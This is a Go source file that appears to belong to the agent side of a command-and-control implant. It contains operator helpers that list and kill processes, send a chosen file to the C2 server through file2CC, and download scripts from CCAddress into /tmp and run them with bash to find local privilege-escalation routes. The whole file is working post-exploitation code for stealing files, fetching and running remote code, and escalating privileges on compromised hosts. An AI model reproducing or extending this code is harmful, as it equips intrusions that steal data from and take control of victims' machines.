package agent

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"

	gops "github.com/mitchellh/go-ps"
)

// shellHelper ps and kill and other helpers
func shellHelper(cmdSlice []string) (out string) {
	cmd := cmdSlice[0]
	args := cmdSlice[1:]

	switch cmd {
	case "#ps":
		procs, err := gops.Processes()
		if err != nil {
			out = fmt.Sprintf("failed to ps: %v", err)
		}

		for _, proc := range procs {
			out = fmt.Sprintf("%s\n%d<-%d    %s", out, proc.Pid(), proc.PPid(), proc.Executable())
		}
	case "#kill":
		for _, pidStr := range args {
			pid, err := strconv.Atoi(pidStr)
			if err != nil {
				continue
			}
			proc, err := os.FindProcess(pid)
			if err != nil {
				continue
			}

			// kill process
			err = proc.Kill()
			if err != nil {
				out = fmt.Sprintf("%s\nfailed to kill %d: %v", out, pid, err)
				continue
			}
			out = fmt.Sprintf("%s\nsuccessfully killed %d", out, pid)
		}
	case "#get":
		filepath := args[0]
		checksum, err := file2CC(filepath)
		out = fmt.Sprintf("%s (%s) has been sent, please check", filepath, checksum)
		if err != nil {
			out = filepath + err.Error()
		}
	default:
		out = "Unknown helper"
	}

	return
}

// lpeHelper runs les and upc to suggest LPE methods
func lpeHelper(method string) string {
	err := Download(CCAddress+method, "/tmp/"+method)
	if err != nil {
		return "LPE error: " + err.Error()
	}
	lpe := fmt.Sprintf("/tmp/%s", method)

	cmd := exec.Command("/bin/bash", lpe)
	if method == "lpe_upc" {
		cmd = exec.Command("/bin/bash", lpe, "standard")
	}

	outBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "LPE error: " + string(outBytes)
	}

	return string(outBytes)
}
